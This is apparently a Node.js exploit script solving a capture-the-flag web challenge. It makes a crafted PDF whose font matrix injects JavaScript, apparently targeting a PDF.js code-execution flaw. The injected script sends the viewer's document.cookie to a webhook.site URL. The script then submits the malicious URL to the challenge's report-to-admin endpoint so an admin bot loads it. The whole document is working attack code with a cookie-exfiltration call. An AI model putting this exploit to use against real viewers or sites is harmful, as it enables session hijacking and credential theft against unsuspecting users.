#!/usr/bin/env -S node

const origin = "http://the-resume-of-mr-balls.tudc.tf";
const webhook = "https://webhook.site/242a69cb-0194-456a-8c15-25ab65a58520";

const payload = `
import { PageTop, PageBottom, PageBreak, Tailwind } from "@fileforge/react-print";
import * as React from "react";
// @ts-ignore
import { render } from "./render";

export default function Document() {
  // No JSX syntax highlighting sadly, I tried
  return (
    <Tailwind>
      <PageTop>
        <span>Hello #1 {Math.random()}</span>
      </PageTop>
      <div>Hello #2</div>
      <PageBottom>
        <div className="text-gray-400 text-sm">Hello #3</div>
      </PageBottom>
      <PageBreak />
      <span>Hello #4, but on a new page ! </span>
    </Tailwind>
  );
};

const stringToBytes = (str: string) => {
  return Uint8Array.from([...str].map(char => char.charCodeAt(0)))
}

Response.prototype.arrayBuffer = async function() {
  const payload = \`fetch("${webhook}?cookie=" + document.cookie)\`
    .replaceAll("(", "\\\\(")
    .replaceAll(")", "\\\\)");
  const str = \`
1 0 obj
<<
/Pages 2 0 R
/Type/Catalog
>>
endobj

2 0 obj
<<
/Type/Pages
/Kids[3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type/Page
/Parent 2 0 R
/Resources 4 0 R
/Contents 6 0 R
/MediaBox[0 0 420 69]
>>
endobj

4 0 obj
<<
/Font<<
  /F1 5 0 R
>>
>>
endobj

5 0 obj
<<
/Subtype/Type1
/FontMatrix [0.1 0 0 0.1 0 (1\\\\);
\${payload}
//)]
/FontDescriptor 7 0 R
>>
endobj

6 0 obj
<<
>>
stream
BT
  /F1 90 Tf
  /P1 scn
  ($) \\'
ET
endstream
endobj

7 0 obj
<<
/Type/FontDescriptor
/FontBBox[0 0 0 0]
/FontName/Balls
/FontFile3 8 0 R
>>
endobj

8 0 obj
<<
/Length 1
>>
stream

endstream
endobj

trailer
<<
/Root 1 0 R
>>
\`;

  return stringToBytes(str).buffer;
}

render(<Document />);
`.trimStart();

const payloadUrl = `${origin}/#${btoa(payload)}`;

const res = await fetch(`${origin}/report-to-admin`, {
  method: "POST",
  body: payloadUrl,
});

console.log(await res.text());
